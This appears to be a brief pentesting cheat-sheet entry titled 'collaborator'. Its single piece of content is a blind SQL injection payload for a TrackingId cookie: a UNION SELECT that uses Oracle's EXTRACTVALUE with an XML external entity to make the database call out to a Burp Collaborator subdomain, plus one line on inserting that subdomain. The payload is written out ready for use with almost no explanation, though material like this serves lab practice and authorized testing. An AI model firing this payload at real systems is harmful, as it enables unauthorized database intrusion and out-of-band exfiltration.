# collaborator

```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

> BURP-COLLABORATOR-SUBDOMAIN -> "Insert Collaborator payload" to insert a Burp Collaborator subdomain from the Burp -> Burp Collaborator client
